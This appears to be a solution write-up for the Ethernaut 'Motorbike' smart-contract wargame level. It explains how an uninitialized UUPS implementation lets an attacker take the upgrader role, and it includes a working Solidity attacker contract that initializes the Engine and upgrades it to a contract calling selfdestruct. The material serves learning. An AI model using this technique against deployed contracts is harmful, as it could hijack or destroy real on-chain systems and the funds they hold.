# Motorbike Ethernaut

## Goals

=> Ethernaut's motorbike has a brand new upgradeable engine design.

=> Would you be able to selfdestruct its engine and make the motorbike unusable ?

### Hints

- EIP-1967
- UUPS upgradeable pattern
- Initializable contract

### Solution

- We need to become the `upgrader` to be able to call the only external function, if we can achieve that we can call `upgradeAndCall()` and point to our new "Implementation" which will just be a contract that implements a function that uses `selfdestruct`

- By querying the storage slot of the `_IMPLEMENTATION_SLOT` constant like `await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")` in the ethernaut console, we can see what value is stored at that slot which will give us the implementation address `0x38b8daa1c50992832ed0f9f30520a7e232ad3ae6` now we can look inside that address for the `owner` variable, when checking that, we will see its set to the zero address which means this contract has not been initialized properly

- Now we can build a smart contract that implements a function that initializes the `Engine` contract and then calls a function inside the `upgradeAndCall()` function that then uses the `selfdestruct()` function

### Attacker Contract

```solidity
contract Hack {
    // Implementation Slot: "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
    // Implementation Slots value: "0x00000000000000000000000038b8daa1c50992832ed0f9f30520a7e232ad3ae6"
    // => Implementation address = 0x38b8daa1c50992832ed0f9f30520a7e232ad3ae6
    // upgrader = 0x0000000000000000000000000000000000000000

    function attack(Engine _engine) external {
        _engine.initialize();
        _engine.upgradeToAndCall(
            address(this),
            abi.encodeWithSelector(this.destroyEngine.selector)
        );
    }

    function destroyEngine() external {
        selfdestruct(payable(address(0)));
    }
}
```
